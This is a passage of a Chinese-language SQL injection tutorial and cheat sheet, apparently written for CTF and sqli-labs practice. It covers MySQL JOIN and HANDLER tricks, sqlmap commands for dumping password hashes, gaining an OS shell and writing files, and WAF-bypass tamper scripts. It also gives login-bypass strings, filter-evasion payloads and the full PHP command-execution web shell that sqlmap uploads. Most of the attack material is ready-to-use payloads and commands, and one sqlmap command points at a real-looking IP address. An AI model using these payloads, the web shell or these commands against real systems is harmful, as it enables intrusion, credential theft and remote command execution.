batman^mob!le || admin^admin || admin1^admin1 || admin2^admin2 || admin3^admin3 || dhakkan^dumbo || admin4^admin4 || Dummy&#x27;#^123 |+----------------------+15 rows in set (0.00 sec)# select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a limit 0,1; 15.3 JOIN 爆破本质：通过 报错 得到列名 join 连接两张表 using() 用于两张表之间的 join 连接查询，并且 using()中的列在两张表中都存在，作为 join 的条件 12345678910# 常用语句 select * from (select * from 表名 as a join 表名 as b)as c;# 一一爆字段select * from (select * from users as a join news as b)as c;select * from (select * from users a join users b using(id))c;select * from (select * from users a join users b using(id,name))c;# 爆内容select * from (select * from users a join users b using(id,name,passwd))c; 测试 创建表： 12345create table users(id int,name varchar(20),passwd varchar(32));insert into users value(1,&#x27;mickey&#x27;,&#x27;827ccb0eea8a706c4c34a16891f84e7b&#x27;);create table news(is_admin int(1),id int(2),title varchar(100),date date);insert into news values(1,1,&#x27;hello,mickey&#x27;,now()); 123456789101112131415161718# 爆列名mysql&gt; select * from (select * from users as a join news as b)as c;ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;mysql&gt; select * from (select * from users a join users b using(id))c;ERROR 1060 (42S21): Duplicate column name &#x27;name&#x27;mysql&gt; select * from (select * from users a join users b using(id,name))c;ERROR 1060 (42S21): Duplicate column name &#x27;passwd&#x27;# 爆内容mysql&gt; select * from (select * from users a join users b using(id,name,passwd))c;+------+--------+----------------------------------+| id | name | passwd |+------+--------+----------------------------------+| 1 | mickey | 827ccb0eea8a706c4c34a16891f84e7b |+------+--------+----------------------------------+1 row in set (0.00 sec) 123456789101112131415161718# 爆列名mysql&gt; select * from (select * from news a join news b using(id))as c;ERROR 1060 (42S21): Duplicate column name &#x27;is_admin&#x27;mysql&gt; select * from (select * from news a join news b using(id,is_admin))as c;ERROR 1060 (42S21): Duplicate column name &#x27;title&#x27;mysql&gt; select * from (select * from news a join news b using(id,is_admin,title))as c;ERROR 1060 (42S21): Duplicate column name &#x27;date&#x27;# 爆内容mysql&gt; select * from (select * from news a join news b using(id,is_admin,title,date))as c;+----------+------+--------------+------------+| is_admin | id | title | date |+----------+------+--------------+------------+| 1 | 1 | hello,mickey | 2021-07-26 |+----------+------+--------------+------------+1 row in set (0.04 sec) 十六、Mysql 查询语句 之 Handler官方文档 mysql除可使用select查询表中的数据，也可使用handler语句，它每次只能查询1条记录，而 select 可以根据需要返回多条查询结果。因此 handler语 句并不具备 select 语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。 可以降低优化器对于SQL语句的解析与优化开销，从而提升查询性能。 测试： 1234567891011create database practice;use practice;create table handler_table(id int,username varchar(10));desc handler_table;insert into handler_table values(1,&#x27;李华&#x27;);insert into handler_table values(2,&#x27;小马&#x27;);insert into handler_table values(3,&#x27;张鑫&#x27;);insert into handler_table values(4,&#x27;周明&#x27;);insert into handler_table values(5,&#x27;蔡紫&#x27;);select * from handler_tables; 不通过索引查表： 12345678910#打开句柄handler handler_table open;#查询数据handler handler_table read first;handler handler_table read next;handler handler_table read next;handler handler_table read next;handler handler_table read next;#关闭句柄handler handler_table close; 12345mysql&gt; handler handler_table close;Query OK, 0 rows affected (0.00 sec)mysql&gt; handler handler_table read next;ERROR 1109 (42S02): Unknown table &#x27;handler_table&#x27; in HANDLER 通过索引查表：需要创建索引 1234567891011#以 handler_table 中的 id 字段创建索引，命名为 handler_indexcreate index handler_index on handler_table(id);#打开句柄，命名为 phandler handler_table open as p;#查看数据handler p read handler_index first;#第一行handler p read handler_index next;#下一行handler p read handler_index prev;#上一行handler p read handler_index last;#最后一行#关闭句柄handler p close; 123456789101112#以 handler_table 中的 id 字段创建索引，命名为 handler_indexcreate index handler_index on handler_table(id);#打开句柄handler handler_table open;#查看特定位置的数据handler p handler_table read handler_index=(3);handler handler_table read handler_index first;#查第一条handler handler_table read handler_index next;#查下一条handler handler_table read handler_index prev;#查上一条handler handler_table read handler_index last;#查最后一条#关闭句柄handler handler_table close; 12#删除索引drop index handler_index on handler_table; Handler 与 select 的比较： select语句一次返回所有相关行，handler每次返回一行 HANDLER涉及的分析较少，比SELECT更快 没有优化程序或查询校验开销 在两个管理程序请求之间，不需要锁定表。 参考 十七、SQLmap17.1 基本手法简介 支持大量的数据库 支持多种SQL注入：布尔盲注，时间注入，报错注入，联合查询，堆叠注入，使用脚本 加上 -v -3 会显示出其注入语句 12345手册：python sqlmap.py -hh 导航：python sqlmap.py --wizard 测试URL: python sqlmap.py -u &quot;url&quot; 常用测试（不确定注入手段） 1234567python sqlmap.py -u &quot;url&quot;python sqlmap.py -u &quot;url&quot; --tamper randomcase.pypython sqlmap.py -u &quot;url&quot; --level 3//level用于设置注入等级1~6，等级越高，包括的自动注入手段越多 查看权限 12345python sqlmap.py -u &quot;url&quot; --privileges #查看数据库用户权限python sqlmap.py -u &quot;url&quot; --is-dba #判断是否是数据库管理员python sqlmap.py -u &quot;url&quot; --roles #枚举数据库用户角色 基本信息命令 1234567891011121314151617查看所有用户：当当前用户有权限去读取包含所有用户的表的权限时，该命令可以列出所有的管理员用户 python sqlmap.py -u &quot;url&quot; --users 查看当前用户： python sqlmap.py -u &quot;url&quot; --current-user 查看所有用户的 数据库用户密码： python sqlmap.py -u &quot;url&quot; --passwords python sqlmap.py -u &quot;url&quot; --dbs 获取 shell: python sqlmap.py -u &quot;url&quot; --os-shell 常用注入命令 12345678910111213141516171819查看数据库 python sqlmap.py -u &quot;url&quot; --dbs查看 当前 网站数据库： python sqlmap.py -u &quot;url&quot; --current-db 获取当前网站数据库用户的名称： python sqlmap.py -u &quot;url&quot; --current-user 查表 python sqlmap.py -u &quot;url&quot; -D &quot;security&quot; --tables 查列 python sqlmap.py -u &quot;url&quot; -D &quot;security&quot; -T &quot;users&quot; --columns 查字段内容 python sqlmap.py -u &quot;url&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump POST 表单，登录框注入 123notepad post.txt将post请求复制粘贴过去post请求；python sqlmap.py -r &quot;post.txt(包含有post请求的文件)&quot; 1234567891011121314151617python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/ --forms --level=5 --dbspython sqlmap.py -r 文件路径+文件名.txt --dbspython sqlmap.py -r post.txt --password --batchpython sqlmap.py -r post.txt --os-shellpython sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; --tables python sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; -T &quot;表名&quot; --columns python sqlmap.py -u &quot;url&quot; -D &quot;库名&quot; -T &quot;表名&quot; -C &quot;字段名（注意：包含所有的）&quot; --dump python sqlmap.py -u &quot;url&quot; --priveliges #查看数据库用户权限 python sqlmap.py -u &quot;url&quot; --is-dba #判断是否是数据库管理员 123python sqlmap.py -u &quot;http://139.9.112.46:20871/&quot; --data=&quot;uname=admin&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&quot; --sql-shellselect @@version; &#x27;10.0.27-MariaDB-0ubuntu0.16.04.1&#x27;select @@plugin_dir; &#x27;/usr/lib/mysql/plugin/&#x27; 17.2 进阶 探测等级： 123--level 5--level 2 # HTTP cookie等--level 3 # HTTP User-Agent/Referer等 一共五个等级，不加 level 时等级为1，等级越高，进行测试的 Payload 越多。会自动破解出 cookie XFF等注入方式。 1--is-dba # 当前用户是否是管理员权限，即当前账户是否是数据管理员账户 1--roles # 列出数据库管理员角色 查看数据库用户角色，如果当前用户有权限读取包含所有用户的表时，即可列出。该命令仅仅适用于数据库是 Oracle 时。 12--referer http://www.baidu.com# sqlmap 可进行伪造 HTTP 中的 Referer 头，当 --level &gt;=3 时，可使用 referer 欺骗 12--sql-shell # 运行自定义的 sql 语句# 会进入 sql-shell&gt; 交互，可直接输入 sql 语句进行执行 123--os-cmd--os-shell# 运行任意操作系统命令 当数据库为MySQL、PostgreSQL或SQLserver且当前用户具有权限使用特定函数时该指令生效，但实现的原理有所不同。 数据库为MySQL和PostgreSQL时，sqlmap商户餐一个二进制库，包含用户自定义的函数sys_exec()和sys_eval()这两个函数可以执行系统命令。在Microsoft SQL Server中，sqlmap使用xp_cmdshell存储过程，如果被禁用（2005及以上版本默认禁用），sqlmap会重新启用它，如果不存在则会被创建。 –os-shell 参数可以模拟一个真实的Shell，当不能执行多语句时，仍可以使用INTO OUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言。（要执行改参数，需要有数据库管理员权限，–is-dba为True） –os-shell的利用执行条件三个： （1）网站必须是root权限 （2）攻击者需要知道网站的绝对路径 （3）GPC为off，php主动转义的功能关闭 Sqlmap getshell的条件 1.网站必须是root权限2.知道网站的绝对路径 123sqlmap.py -u &quot;&quot; --sql-shell# 进入交互环境 输入select @@datadir 常见找绝对路径方法：1.网页报错信息2.Phpinfo，探针3.数据库查询，暴力破解 3.PHP关闭魔术引号，php主动转义功能关闭 magic_quotes_gpc=Off 4.secure_file_priv=值为空：secure_file_priv参数是用来限制LOAD DATA,SELECT…OUTFILE,and LOAD_FILE()传到哪个指定目录的 1show global variables like &#x27;%secure%&#x27;; 如果是为空，说明MYSQL默认没有secure_file_priv参数，因此在mysql-ini进行添加配置添加语句secure_file_priv= 即可 测试： 选择网站语言 输入绝对网站路径 进入 os-shell&gt; 交互环境 查看网站根目录，发现生成文件 原理：用into outfile 函数将一个可以用来上传文件的 php 文件写到网站的根目录下 然后利用该上传脚本我们可以上传木马文件，进行访问，蚁剑链接，getshell sqlmap 会自动利用上传文件上传一个恶意文件，该文件可以用来执行系统命令，并将结果返回，则我们可以在交互环境下，进行命令执行。 http://www.qishunwang.net/news_show_47793.aspx https://www.cnblogs.com/zzjdbk/p/13951047.html 该上传文件页面如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?php$c=$_REQUEST[&quot;cmd&quot;];@set_time_limit(0);@ignore_user_abort(1);@ini_set(&#x27;max_execution_time&#x27;,0);$z=@ini_get(&#x27;disable_functions&#x27;);if(!empty($z))&#123; $z=preg_replace(&#x27;/[, ]+/&#x27;,&#x27;,&#x27;,$z); $z=explode(&#x27;,&#x27;,$z); $z=array_map(&#x27;trim&#x27;,$z);&#125;else &#123; $z=array(); &#125;$c=$c.&quot; 2&gt;&amp;1\\n&quot;;function f($n)&#123;global $z;return is_callable($n)and!in_array($n,$z);&#125;if(f(&#x27;system&#x27;))&#123;ob_start();system($c);$w=ob_get_contents();ob_end_clean();&#125;elseif(f(&#x27;proc_open&#x27;))&#123; $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t); $w=NULL; while(!feof($t[1]))&#123; $w.=fread($t[1],512); &#125; @proc_close($y);&#125; elseif(f(&#x27;shell_exec&#x27;))&#123; $w=shell_exec($c); &#125; elseif(f(&#x27;passthru&#x27;))&#123; ob_start(); passthru($c); $w=ob_get_contents(); ob_end_clean(); &#125;elseif(f(&#x27;popen&#x27;))&#123; $x=popen($c,r); $w=NULL; if(is_resource($x))&#123; while(!feof($x))&#123; $w.=fread($x,512); &#125; &#125; @pclose($x); &#125;elseif(f(&#x27;exec&#x27;))&#123; $w=array(); exec($c,$w); $w=join(chr(10),$w).chr(10); &#125;else&#123; $w=0; &#125; print &quot;&lt;/pre&gt;&quot;.$w.&quot;&lt;/pre&gt;&quot;;?&gt;&#x27;&#x27;&#x27; 12--file-read# 从数据库服务器中读取文件 适用于MySQL、PostgreSQL或Microsoft SQL Server且当前用户有权限执行特定的函数时。读取的文件可以是文本可以是二进制文件。 1python sqlmap.py -u &quot;&quot; --file-read &quot;路径&quot; -v 1 12345--file-write --file-dest# 上传文件到数据库服务器中# file-write 从本地写入# file-dest 写入目标路径 数据库：MySQL、PostgreSQL、Microsoft SQL Server且：当前用户有权限使用特定的函数时。可以上传文本文件或二进制文件 1234sqlmap.py -u &quot;http://www.xx.com/aa.aspx?id=123&quot; --file-write=本地文件路径 --file-dest 网站路径(写入路径)+&quot;/写入的文件名&quot;sqlmap.py -u &quot;http://www.xx.com/aa.aspx?id=123&quot; --file-write=F:/a.aspx --file-dest D:/虚拟目录/Front/cx.aspx 17.3 –tampersqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。 https://blog.csdn.net/qq_34444097/article/details/82717357 绕过脚本目录在 sqlmap/tamper，目前官方提供 53 个绕过脚本 1sqlmap -u [url] --tamper [模块名] 可以使用–identify-waf对一些网站是否有安全防护进行试探 0x02 常用tamper脚本apostrophemask.py适用数据库：ALL作用：将引号替换为utf-8，用于过滤单引号使用脚本前：tamper(“1 AND ‘1’=’1”)使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871 base64encode.py适用数据库：ALL作用：替换为base64编码使用脚本前：tamper(“1’ AND SLEEP(5)#”)使用脚本后：MScgQU5EIFNMRUVQKDUpIw== multiplespaces.py适用数据库：ALL作用：围绕sql关键字添加多个空格使用脚本前：tamper(‘1 UNION SELECT foobar’)使用脚本后：1 UNION SELECT foobar space2plus.py适用数据库：ALL作用：用加号替换空格使用脚本前：tamper(‘SELECT id FROM users’)使用脚本后：SELECT+id+FROM+users nonrecursivereplacement.py适用数据库：ALL作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）使用脚本前：tamper(‘1 UNION SELECT 2–’)使用脚本后：1 UNIOUNIONN SELESELECTCT 2– space2randomblank.py适用数据库：ALL作用：将空格替换为其他有效字符使用脚本前：tamper(‘SELECT id FROM users’)使用脚本后：SELECT%0Did%0DFROM%0Ausers unionalltounion.py适用数据库：ALL作用：将union allselect 替换为unionselect使用脚本前：tamper(‘-1 UNION ALL SELECT’)使用脚本后：-1 UNION SELECT securesphere.py适用数据库：ALL作用：追加特定的字符串使用脚本前：tamper(‘1 AND 1=1’)使用脚本后：1 AND 1=1 and ‘0having’=’0having’ space2dash.py适用数据库：ALL作用：将空格替换为–，并添加一个随机字符串和换行符使用脚本前：tamper(‘1 AND 9227=9227’)使用脚本后：1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227 space2mssqlblank.py适用数据库：Microsoft SQL Server测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)使用脚本前：tamper(‘SELECT id FROM users’)使用脚本后：SELECT%0Eid%0DFROM%07users between.py测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0作用：用NOT BETWEEN 0 AND #替换&gt;使用脚本前：tamper(‘1 AND A &gt; B–’)使用脚本后：1 AND A NOT BETWEEN 0 AND B– percentage.py适用数据库：ASP测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0作用：在每个字符前添加一个%使用脚本前：tamper(‘SELECT FIELD FROM TABLE’)使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E sp_password.py适用数据库：MSSQL作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password使用脚本前：tamper(‘1 AND 9227=9227– ‘)使用脚本后：1 AND 9227=9227– sp_password charencode.py测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 randomcase.py测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0作用：随机大小写使用脚本前：tamper(‘INSERT’)使用脚本后：INseRt charunicodeencode.py适用数据库：ASP、ASP.NET测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3作用：适用字符串的unicode编码使用脚本前：tamper(‘SELECT FIELD%20FROM TABLE’)使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045 space2comment.py测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0作用：将空格替换为//使用脚本前：tamper(‘SELECT id FROM users’)使用脚本后：SELECT//id//FROM//users equaltolike.py测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5作用：将=替换为LIKE使用脚本前：tamper(‘SELECT * FROM users WHERE id=1’)使用脚本后：SELECT * FROM users WHERE id LIKE 1 equaltolike.py测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0作用：将&gt;替换为GREATEST，绕过对&gt;的过滤使用脚本前：tamper(‘1 AND A &gt; B’)使用脚本后：1 AND GREATEST(A,B+1)=A ifnull2ifisnull.py适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)测试通过数据库：MySQL 5.0 and 5.5作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤使用脚本前：tamper(‘IFNULL(1, 2)’)使用脚本后：IF(ISNULL(1),2,1) modsecurityversioned.py适用数据库：MySQL测试通过数据库：MySQL 5.0作用：过滤空格，使用mysql内联注释的方式进行注入使用脚本前：tamper(‘1 AND 2&gt;1–’)使用脚本后：1 /!30874AND 2&gt;1/– space2mysqlblank.py适用数据库：MySQL测试通过数据库：MySQL 5.1作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)使用脚本前：tamper(‘SELECT id FROM users’)使用脚本后：SELECT%0Bid%0DFROM%0Cusers modsecurityzeroversioned.py适用数据库：MySQL测试通过数据库：MySQL 5.0作用：使用内联注释方式（/!00000/）进行注入使用脚本前：tamper(‘1 AND 2&gt;1–’)使用脚本后：1 /!00000AND 2&gt;1/– space2mysqldash.py适用数据库：MySQL、MSSQL作用：将空格替换为 – ，并追随一个换行符使用脚本前：tamper(‘1 AND 9227=9227’)使用脚本后：1–%0AAND–%0A9227=9227 bluecoat.py适用数据库：Blue Coat SGOS测试通过数据库：MySQL 5.1,、SGOS作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=使用脚本前：tamper(‘SELECT id FROM users where id = 1’)使用脚本后：SELECT%09id FROM users where id LIKE 1 versionedkeywords.py适用数据库：MySQL测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11作用：注释绕过使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)使用脚本后：1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/!AS//!CHAR/),CHAR(32)),CHAR(58,100,114,117,58))# halfversionedmorekeywords.py适用数据库：MySQL &lt; 5.1测试通过数据库：MySQL 4.0.18/5.0.22作用：在每个关键字前添加mysql版本注释使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)使用脚本后：value’/!0UNION/!0ALL/!0SELECT/!0CONCAT(/!0CHAR(58,107,112,113,58),/!0IFNULL(CAST(/!0CURRENT_USER()/!0AS/!0CHAR),/!0CHAR(32)),/!0CHAR(58,97,110,121,58)),/!0NULL,/!0NULL#/!0AND ‘QDWa’=’QDWa space2morehash.py适用数据库：MySQL &gt;= 5.1.13测试通过数据库：MySQL 5.1.41作用：将空格替换为#，并添加一个随机字符串和换行符使用脚本前：tamper(‘1 AND 9227=9227’)使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227 apostrophenullencode.py适用数据库：ALL作用：用非法双字节Unicode字符替换单引号使用脚本前：tamper(“1 AND ‘1’=’1”)使用脚本后：1 AND %00%271%00%27=%00%271 appendnullbyte.py适用数据库：ALL作用：在有效载荷的结束位置加载null字节字符编码使用脚本前：tamper(‘1 AND 1=1’)使用脚本后：1 AND 1=1%00 chardoubleencode.py适用数据库：ALL作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545 unmagicquotes.py适用数据库：ALL作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格使用脚本前：tamper(“1’ AND 1=1”)使用脚本后：1%bf%27 AND 1=1– randomcomments.py适用数据库：ALL作用：用注释符分割sql关键字使用脚本前：tamper(‘INSERT’)使用脚本后：I//N//SERT 在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。 十八、绕过姿势 str_replace()任何的表名、数据库名都可以使用十六进制代替 1?id=-1%df&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= 0x7365637572697479),3--+ 万能密码：$sql=&quot;select * from test where username=&#39; XX &#39; and password=&#39; XX &#39; &quot;; 12345678910# 不知用户名时&#x27; or 1--+ # 注释闭合&#x27; or &#x27;1&#x27;=&#x27;1 # 手动闭合&#x27; or &#x27;1&#x27;=&#x27;1&#x27;# # 使用了注释## 知道一个用户名admin&#x27; or &#x27;1&#x27;=&#x27;1# 可尝试1&#x27;or(1)# 过滤 注释： 法一：截断 ;%00 12;%00?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1);%00 法二：手动闭合 121&#x27;and&#x27;1&#x27;=&#x27;1?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)and&#x27;1&#x27;=&#x27;1 过滤空格： 括号包围：对于一些字段名可使用括号包围 1?id=1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1);%0 字符编码绕过： 12345678910# 可以绕过空格的编码：%09 Tab键-水平%0a 换行%0c 换页%0b Tab键-垂直%0d%00%a0 在特定字符集才可使用# 特殊的 /**/ 大小写绕过： Mysql 中，关键字是不区分大小写的，如果仅仅是过滤了 select ，那么我们可以使用 SelECt ，进行大小写混写绕过。 正则匹配： 正则如果匹配 \\bselect\\b ，我们可以使用 /*!50000select*/ 绕过。 一次过滤：双写绕过： 123$id=preg_replace(&#x27;/or/i&#x27;,&quot;&quot;,$id);$id=preg_replace(&#x27;/and/i&#x27;,&quot;&quot;,$id);$id=preg_replace(&#x27;/select/i&#x27;,&quot;&quot;,$id); and or 过滤：双写绕过，或者是 &amp;&amp;–&gt;%26%26 ||–&gt;%7c%7c 123?id=1&#x27;||updatexml(1,concat(0x7e,database(),0x7e),1);%00?id=1&#x27;||updatexml(1,concat(0x7e,database(),0x7e),1)||&#x27;1&#x27;=&#x27;1 过滤了单双引号，但没有过滤 反斜杠 \\ 例如：sql 语句 1$sql=&quot;select * from nres where id=&#x27;可控参数1&#x27; and title=&#x27;可控参数2&#x27;&quot;; 我们可以进行如下构造，不使用 单双引号，利用反斜杠 12345id=a\\title=or sleep(3)##这样拼起来的 sql 语句就是$sql=&quot;select * from nres where id=&#x27;a\\&#x27; and title=&#x27;or sleep(3)#&#x27;&quot;;# 如此，or sleep(3)# 便成了一个整体，将会成功执行后面的 sleep(3) 使用 12select * from users where id=&#x27;a\\&#x27; and username=&#x27; or sleep(2)#&#x27;select * from users where id=&#x27;a\\&#x27; and username=&#x27;union select 1,2,(select concat(username,0x7e,password) from users limit 1)#&#x27; 引号逃逸：其实就是由于做了转义 对单引号、双引号等进行转义之后，在一定程度上妨碍了我们的注入，当遇到这种情况，我们可以考虑：宽字节注入、二次注入、HTTP 头部注入 字符串截断： 在一些标题等位置，开发者一般会限制标题的字符长度，如果超过，有可能会被截断。 代码： 12345678910111213&lt;?php $conn = mysqli_connect(&#x27;127.0.0.1&#x27;,&#x27;root&#x27;,&#x27;123456&#x27;,&#x27;security&#x27;); $title = addslashes($_GET[&#x27;title&#x27;]); echo $title; $title = substr($title,0,10); #做了截断处理 echo &#x27;&lt;br /&gt;&#x27;.$title; echo &#x27;&lt;h1&gt;$title&lt;/h1&gt;&#x27;; $content = addslashes($_GET[&#x27;content&#x27;]); echo $content; $sql = &quot;insert into users values(15, &#x27;$title&#x27; , &#x27;$content&#x27;)&quot;; echo &#x27;&lt;br /&gt;&#x27;.$sql; $res = mysqli_query($conn,$sql);?&gt; 如果攻击者想进行 sql 注入测试，可以选择输入 aaaaaaaaa&#39; ，则经过转义之后，将会变为 aaaaaaaaa\\&#39; ，但是由于后面的截断，将变成 aaaaaaaaa\\。 使用： 1?title=aaaaaaaaa\\&#x27;&amp;content=,1),(16,321,2)--+ 这样拼接到 sql 语句中就变成 1insert into news values(15, &#x27;aaaaaaaaa\\&#x27; , &#x27;,1),(16,321,2)--+&#x27;) 这样 由于转义使得 aaaaaaaaa\\&#39; , 成为了由单引号包围的一部分，也就成功执行了 插入语句。 过滤等号 = 使用 like 1a&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))or&#x27; 十九、其它 在以上的任何一个注入方式中，都有可能对用户所输入的内容进行编码，例如进行 base64 编码，我们进行爆破时要记得编码； Nosql 注入 https://www.cnblogs.com/bonelee/p/12158385.html 二十、解决查内容时一次显示不全方法一：一条一条查 123and updatexml(1,concat(0x5e,(select concat(username,&#x27;~&#x27;,password) from security.users limit 0,1),0x5e),1)#and updatexml(1,concat(0x5e,(select concat_ws(&#x27;~&#x27;,username,password) from security.users limit 0,1),0x5e),1)# 方法二：substr(,,) 1234# 每次查30个字符and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(&#x27;~&#x27;,username,password)),1,30) from security.users),0x5e),1)#and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(&#x27;~&#x27;,username,password)),31,30) from security.users),0x5e),1)# 总结：regexp 正则匹配速查表12# 使用&lt;内容&gt; regexp &#x27;正则表达式&#x27; 选项 说明 例子 匹配值示例 ^ 匹配文本的开始字符 ‘^b’ 匹配以字母 b 开头的字符串 book、big、banana、bike $ 匹配文本的结束字符 ‘st$’ 匹配以 st 结尾的字符串 test、resist、persist . 匹配任何单个字符 ‘b.t’ 匹配任何 b 和 t 之间有一个字符 bit、bat、but、bite * 匹配零个或多个在它前面的字符 ‘f*n’ 匹配字符 n 前面有任意个字符 f fn、fan、faan、abcn + 匹配前面的字符 1 次或多次 ‘ba+’ 匹配以 b 开头，后面至少紧跟一个 a ba、bay、bare、battle &lt;字符串&gt; 匹配包含指定字符的文本 ‘fa’ 匹配包含‘fa’的文本 fan、afa、faad [字符集合] 匹配字符集合中的任何一个字符 ‘[xz]’ 匹配 x 或者 z dizzy、zebra、x-ray、extra [^ ] 匹配不在括号中的任何字符 ‘[^abc]’ 匹配任何不包含 a、b 或 c 的字符串 desk、fox、f8ke 字符串{n,} 匹配前面的字符串至少 n 次 ‘b{2}’ 匹配 2 个或更多的 b bbb、bbbb、bbbbbbb 字符串 {n,m} 匹配前面的字符串至少 n 次， 至多 m 次 ‘b{2,4}’ 匹配最少 2 个，最多 4 个 b bbb、bbbb 匹配中文时：regexp &#39;(文字)&#39; 123regexp &#x27;[文字]&#x27; #报错regexp &#x27;文字&#x27;like &#x27;文字&#x27; Mysql 对文件的操作 load_file() load data infile() system cat 使用条件：1. 有File权限（File_priv的值）；2. secure_file_priv 的值不为 NULL 注：&gt;=5.7.16默认值为NULL，&lt;5.7.16则为空 12#查看 File_privselect File_priv from mysql.user where user=&#x27;root&#x27; and host =&#x27;localhost&#x27;; 12345678910#查看 secure_file_privshow global variables like &quot;secure_file_priv&quot;;值是 NULL --- 不允许文件导入导出操作值是 空 --- 不对mysql的导入导出操作做出限制值是 具体路径 限制mysql的导入与导出操作限制在指定路径下#修改# Windows 下修改 mysql.ini 文件 （secure_file_priv =）# Linux 下在/etc/my.cnf的[mysqld]下面添加local-infile=0选项 读取文件 12345678# load_file()select load_file(&#x27;D:/test.txt&#x27;);# load data infile()# 利用该函数读文件时需要将文件内容保存至一个表中create table test(content text);load data infile &#x27;D:\\\\test.txt&#x27; into table test;select * from test; 写入文件 1select * into outfile &#x27;D:\\\\users.txt&#x27; from 